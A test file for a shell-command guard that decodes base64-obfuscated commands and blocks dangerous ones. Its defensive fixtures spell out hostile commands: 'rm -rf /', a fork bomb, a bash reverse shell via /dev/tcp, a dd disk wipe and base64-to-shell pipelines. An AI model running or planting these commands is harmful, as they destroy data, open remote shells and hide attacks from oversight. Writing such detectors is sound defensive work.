import { describe, it, expect } from 'vitest';
import {
  safelyDecodeBase64,
  detectBase64Exec,
  decodeAndEvaluatePayload,
  createBase64ExecRule,
} from '../src/shell/base64exec.js';
import { createDestructiveDeletionRule } from '../src/shell/destructive.js';
import { createDiskWipeRule } from '../src/shell/diskwipe.js';
import { createForkBombRule } from '../src/shell/forkbomb.js';
import { createReverseShellRule } from '../src/shell/reverseshell.js';
import { SentinelEngine } from '../src/index.js';
import { Verdict } from '../src/types.js';

describe('Base64 Automatic Payload Decoding and Pipeline Re-Evaluation', () => {
  const destructiveRule = createDestructiveDeletionRule();
  const diskWipeRule = createDiskWipeRule();
  const forkBombRule = createForkBombRule();
  const reverseShellRule = createReverseShellRule();

  describe('safelyDecodeBase64', () => {
    it('decodes standard UTF-8 base64 payloads', () => {
      const b64 = Buffer.from('echo "hello world"').toString('base64');
      const decoded = safelyDecodeBase64(b64);
      expect(decoded).toBe('echo "hello world"');
    });

    it('decodes UTF-16LE PowerShell encoded strings', () => {
      const psCommand = 'Get-ChildItem -Recurse | Remove-Item -Force';
      const psB64 = Buffer.from(psCommand, 'utf16le').toString('base64');
      const decoded = safelyDecodeBase64(psB64, true);
      expect(decoded).toBe(psCommand);
    });

    it('handles base64 payloads with whitespace, newlines, and carriage returns', () => {
      const original = 'cat /etc/passwd';
      const b64 = Buffer.from(original).toString('base64');
      const formatted = `  ${b64.slice(0, 4)} \n\t ${b64.slice(4)}  \r\n`;
      const decoded = safelyDecodeBase64(formatted);
      expect(decoded).toBe(original);
    });

    it('returns empty string on empty input', () => {
      expect(safelyDecodeBase64('')).toBe('');
      expect(typeof safelyDecodeBase64('invalid')).toBe('string');
    });
  });

  describe('decodeAndEvaluatePayload', () => {
    it('decodes and intercepts nested destructive rm -rf / payload', async () => {
      // "rm -rf /" in base64: "cm0gLXJmIC8="
      const rawCmd = 'echo "cm0gLXJmIC8=" | base64 -d | sh';
      const res = await decodeAndEvaluatePayload(rawCmd, [destructiveRule]);

      expect(res.detection.isBase64Exec).toBe(true);
      expect(res.detection.decodedCommand).toBe('rm -rf /');
      expect(res.innerViolation).not.toBeNull();
      expect(res.innerViolation?.ruleId).toBe('block-destructive-deletion');
      expect(res.innerViolation?.verdict).toBe(Verdict.BLOCK);
    });

    it('decodes and intercepts nested fork bomb payload', async () => {
      const payload = ':(){ :|:& };:';
      const b64 = Buffer.from(payload).toString('base64');
      const rawCmd = `echo "${b64}" | base64 -d | bash`;
      const res = await decodeAndEvaluatePayload(rawCmd, [forkBombRule]);

      expect(res.detection.isBase64Exec).toBe(true);
      expect(res.detection.decodedCommand).toBe(payload);
      expect(res.innerViolation).not.toBeNull();
      expect(res.innerViolation?.ruleId).toBe('block-fork-bomb');
      expect(res.innerViolation?.verdict).toBe(Verdict.BLOCK);
    });

    it('decodes and intercepts nested reverse shell payload', async () => {
      const payload = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
      const b64 = Buffer.from(payload).toString('base64');
      const rawCmd = `base64 -d <<< "${b64}" | bash`;

      const res = await decodeAndEvaluatePayload(rawCmd, [reverseShellRule]);
      expect(res.detection.isBase64Exec).toBe(true);
      expect(res.detection.decodedCommand).toBe(payload);
      expect(res.innerViolation).not.toBeNull();
      expect(res.innerViolation?.ruleId).toBe('block-reverse-shell');
      expect(res.innerViolation?.verdict).toBe(Verdict.BLOCK);
    });

    it('decodes and intercepts nested disk wipe payload', async () => {
      const payload = 'dd if=/dev/zero of=/dev/sda bs=1M';
      const b64 = Buffer.from(payload).toString('base64');
      const rawCmd = `echo "${b64}" | openssl enc -base64 -d | sh`;

      const res = await decodeAndEvaluatePayload(rawCmd, [diskWipeRule]);
      expect(res.detection.isBase64Exec).toBe(true);
      expect(res.detection.decodedCommand).toBe(payload);
      expect(res.innerViolation).not.toBeNull();
      expect(res.innerViolation?.ruleId).toBe('block-disk-wipe');
    });

    it('returns null innerViolation for benign decoded commands', async () => {
      const payload = 'git status';
      const b64 = Buffer.from(payload).toString('base64');
      const rawCmd = `echo "${b64}" | base64 -d | sh`;

      const res = await decodeAndEvaluatePayload(rawCmd, [
        destructiveRule,
        forkBombRule,
        reverseShellRule,
      ]);
      expect(res.detection.isBase64Exec).toBe(true);
      expect(res.detection.decodedCommand).toBe('git status');
      expect(res.innerViolation).toBeNull();
    });
  });

  describe('createBase64ExecRule with nested re-evaluation', () => {
    it('escalates severity to critical when decoded payload is dangerous', async () => {
      const rule = createBase64ExecRule({
        nestedRules: [destructiveRule, forkBombRule],
      });

      const violation = await rule.evaluate({
        id: 'ctx-1',
        toolName: 'bash',
        params: {
          cmd: 'echo "cm0gLXJmIC8=" | base64 -d | sh',
        },
        timestamp: Date.now(),
      });

      expect(violation).not.toBeNull();
      expect(violation?.severity).toBe('critical');
      expect(violation?.reason).toContain('block-destructive-deletion');
      expect(violation?.reason).toContain('rm -rf /');
    });

    it('defaults to high severity when decoded payload does not violate nested rules', async () => {
      const rule = createBase64ExecRule({
        nestedRules: [destructiveRule],
      });

      const violation = await rule.evaluate({
        id: 'ctx-2',
        toolName: 'bash',
        params: {
          cmd: 'echo "ZWNobyAxMjM=" | base64 -d | sh', // "echo 123"
        },
        timestamp: Date.now(),
      });

      expect(violation).not.toBeNull();
      expect(violation?.severity).toBe('high');
      expect(violation?.reason).toContain('echo 123');
    });
  });

  describe('SentinelEngine integration', () => {
    it('engine blocks base64 attack and records audit trail', async () => {
      const engine = new SentinelEngine();
      engine.registerRule(
        createBase64ExecRule({
          nestedRules: [destructiveRule, reverseShellRule],
        })
      );

      const result = await engine.evaluate({
        id: 'engine-b64-test',
        toolName: 'bash',
        params: {
          command: 'echo "cm0gLXJmIC8=" | base64 -d | sh',
        },
        timestamp: Date.now(),
      });

      expect(result.allowed).toBe(false);
      expect(result.verdict).toBe(Verdict.BLOCK);
      expect(result.violations.length).toBe(1);
      expect(result.violations[0].ruleId).toBe('block-base64-exec');
      expect(result.violations[0].severity).toBe('critical');
    });
  });
});
